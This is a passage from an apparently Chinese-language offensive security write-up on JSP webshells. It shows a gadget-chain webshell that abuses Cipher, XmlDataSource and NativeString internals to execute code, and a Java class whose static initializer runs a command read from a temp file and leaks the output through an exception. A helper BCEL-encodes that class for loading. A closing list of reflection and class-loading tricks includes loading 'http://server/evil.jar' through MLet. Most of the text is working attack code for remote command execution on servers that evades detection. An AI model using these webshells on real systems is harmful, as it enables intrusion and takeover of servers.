        cipherConstructor.setAccessible(true);
        Cipher cipher = (Cipher) cipherConstructor.newInstance(null, null, lazyIterator, null, null);
        Field opmodeField = Cipher.class.getDeclaredField("opmode");
        opmodeField.setAccessible(true);
        opmodeField.set(cipher, 1);
        Field initializedField = Cipher.class.getDeclaredField("initialized");
        initializedField.setAccessible(true);
        initializedField.set(cipher, true);
        CipherInputStream cipherInputStream = new CipherInputStream(
                new ByteArrayInputStream(new byte[0]), cipher);
        Class xmlDataSourceClass = Class
                .forName("com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource");
        Constructor xmlDataSourceConstructor = xmlDataSourceClass.getDeclaredConstructors()[0];
        xmlDataSourceConstructor.setAccessible(true);
        DataSource xmlDataSource = (DataSource) xmlDataSourceConstructor
                .newInstance("", cipherInputStream);
        DataHandler dataHandler = new DataHandler(xmlDataSource);
        Base64Data base64Data = new Base64Data();
        Field dataHandlerField = Base64Data.class.getDeclaredField("dataHandler");
        dataHandlerField.setAccessible(true);
        dataHandlerField.set(base64Data, dataHandler);
        Constructor NativeStringConstructor = NativeString.class
                .getDeclaredConstructor(CharSequence.class, Global.class);
        NativeStringConstructor.setAccessible(true);
        NativeString nativeString = (NativeString) NativeStringConstructor
                .newInstance(base64Data, new Global(new Context(new Options(""), null, null)));
        try {
            new HashMap<>().put(nativeString, "111");
        } catch (Throwable e) {
            response.getOutputStream().write(e.getCause().getMessage().getBytes());
        }
    %>
其实这个就是最早出现在某个序列化组件被发现的gadget
Threedr3am_15:
    import java.io.BufferedReader;
    import java.io.File;
    import java.io.InputStream;
    import java.io.InputStreamReader;
    import java.nio.file.Files;
    import java.nio.file.Paths;
    /**
     * @author threedr3am
     */
    public class Threedr3am_15 {
        static {
            StringBuilder stringBuilder = new StringBuilder();
            try {
                String tmp = System.getProperty("java.io.tmpdir");
                String cmd = new String(Files.readAllBytes(Paths.get(tmp + File.separator + "CMD")));
                InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
                String line;
                while((line = bufferedReader.readLine()) != null) {
                    stringBuilder.append(line).append("\n");
                }
            } catch (Throwable e) {
                e.printStackTrace();
            }
            Integer.parseInt(stringBuilder.toString());
        }
    }
Threedr3am_make:
    import com.sun.org.apache.bcel.internal.classfile.Utility;
    import java.io.BufferedReader;
    import java.io.File;
    import java.io.IOException;
    import java.io.InputStream;
    import java.io.InputStreamReader;
    import java.nio.file.Files;
    import java.nio.file.Paths;
    /**
     * @author threedr3am
     */
    public class Threedr3am_make {
        public static void main(String[] args) throws IOException {
            InputStream inputStream = Threedr3am_make.class.getClassLoader().getResourceAsStream("Threedr3am_15.class");
            byte[] bytes = new byte[inputStream.available()];
            inputStream.read(bytes);
            String code = "$$BCEL$$" + Utility.encode(bytes, true);
            bytes = code.getBytes();
            for (int i = 0; i < bytes.length; i++) {
                System.out.print(bytes[i]);
                if (i != bytes.length - 1)
                    System.out.print(",");
            }
        }
    }
### other
送上一些从jdk lib的jar中搜索出来的一些可能有用的东西。
#### 一、invoke、newInstance反射调用的各种方式
##### 1\. invoke
###### 1.1 Method.invoke
    Method method = Threedr3am.class.getMethod("a");
    method.invoke(null);
###### 1.2 MethodAccessor.invoke
    Method method = Threedr3am.class.getMethod("a");
    ReflectionFactory reflectionFactory = AccessController.doPrivileged(new sun.reflect.ReflectionFactory.GetReflectionFactoryAction());
    MethodAccessor methodAccessor = reflectionFactory.newMethodAccessor(method);
    methodAccessor.invoke(null, null);
###### 1.3 JSClassLoader.invoke
    Method method = Main.class.getDeclaredMethod("a");
    JSClassLoader.invoke(method, null, null);
##### 2\. newInstance
###### 2.1 JSClassLoader.newInstance
    Constructor constructor = Main.class.getConstructor();
    JSClassLoader.newInstance(constructor, null);
###### 2.2 Beans加载并实例化
    Object o = Beans.instantiate(Thread.currentThread().getContextClassLoader(), "java.lang.String");
#### 二、获取class、method、field、constructor的各种方式
##### 1\. class
###### 1.1 ReflectUtil
sun.reflect.misc.ReflectUtil
    ReflectUtil.forName("java.lang.String")
###### 1.2 BytecodeDescriptor
    sun.invoke.util.BytecodeDescriptor.parseMethod("(Ljava/lang/String;)V", null).get(0);
###### 1.3 Class.forName
    Class.forName("java.lang.String");
###### 1.4 ClassLoader.loadClass
    Thread.currentThread().getContextClassLoader().loadClass("java.lang.String");
###### 1.5 JDKBridge.loadClass
    JDKBridge.loadClass("java.lang.String");
###### 1.6 RMIClassLoader.loadClass
    RMIClassLoader.loadClass("java.lang.String")
###### 1.7 MLet
    MLet mLet = new MLet();
    mLet.addURL(new URL("http://server/evil.jar"));
    mLet.loadClass("Evil").newInstance();
##### 2\. method
###### 2.1 MethodUtil
sun.reflect.misc.MethodUtil
    MethodUtil.getMethod(String.class, "valueOf", new Class[]{int.class});
##### 3\. field
###### 3.1 FieldUtil
sun.reflect.misc.FieldUtil
    FieldUtil.getField(String.class, "a");
##### 4\. Constructor
###### 4.1 ConstructorUtil
sun.reflect.misc.ConstructorUtil
    sun.reflect.misc.ConstructorUtil#getConstructor